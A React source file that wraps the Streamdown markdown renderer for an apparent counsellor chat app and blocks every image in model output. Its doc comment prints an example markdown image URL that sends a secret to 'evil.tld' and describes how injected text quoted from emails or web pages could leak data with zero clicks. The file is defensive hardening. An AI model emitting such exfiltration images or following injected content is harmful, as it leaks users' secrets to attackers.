"use client";

import { defaultRehypePlugins, Streamdown } from "streamdown";
import type { ComponentProps } from "react";

type StreamdownProps = ComponentProps<typeof Streamdown>;
type Pluggable = (typeof defaultRehypePlugins)[string];

/** What a model-written image becomes: plain text, never a request. */
export const IMAGE_REMOVED = "[image removed]";

const removedImage = () => <span className="text-muted-foreground">{IMAGE_REMOVED}</span>;

/**
 * Never load an image named by model output. An answer can quote text the model read (an
 * email, a web page, an uploaded file), so `![](https://evil.tld/x?d=<secret>)` or a raw
 * `<img>` in it would be fetched the moment the answer renders -- a zero-click exfiltration
 * channel. Streamdown's default `harden` allows images from any prefix, so it is re-run with
 * no image prefix allowed (a blocked image becomes a text placeholder), and `img`, `picture`
 * and `source` are overridden as a backstop in case an image element slips past it.
 */
const [hardenPlugin, hardenOptions] = defaultRehypePlugins.harden as [Pluggable, Record<string, unknown>];

export const SAFE_REHYPE_PLUGINS: Pluggable[] = Object.entries(defaultRehypePlugins).map(([name, plugin]) =>
  name === "harden"
    ? ([
        hardenPlugin,
        { ...hardenOptions, allowedImagePrefixes: [], allowDataImages: false, blockedImageClass: "text-muted-foreground" },
      ] as Pluggable)
    : plugin,
);

export const SAFE_IMAGE_COMPONENTS = {
  img: removedImage,
  picture: removedImage,
  source: () => null,
} satisfies NonNullable<StreamdownProps["components"]>;

/**
 * Thin wrapper that is both the lazy-loading boundary and the one place model markdown is
 * rendered, so the image rules above cannot be forgotten by a caller: its `components` are
 * merged under the safe overrides and `rehypePlugins` is not accepted.
 *
 * Streamdown pulls in shiki (syntax highlighting) and katex (maths) unconditionally --
 * together the bulk of this route's JavaScript, for features a counsellor chat never
 * renders. `next/dynamic` cannot be pointed at the package directly: that flips Next to
 * its CJS entry, which then fails on shiki's ESM-only language files. Importing it
 * statically *here* and lazy-loading this module keeps resolution as it was while still
 * getting it off the critical path.
 */
export default function Markdown({ components, ...props }: Omit<StreamdownProps, "rehypePlugins">) {
  return <Streamdown {...props} rehypePlugins={SAFE_REHYPE_PLUGINS} components={{ ...components, ...SAFE_IMAGE_COMPONENTS }} />;
}
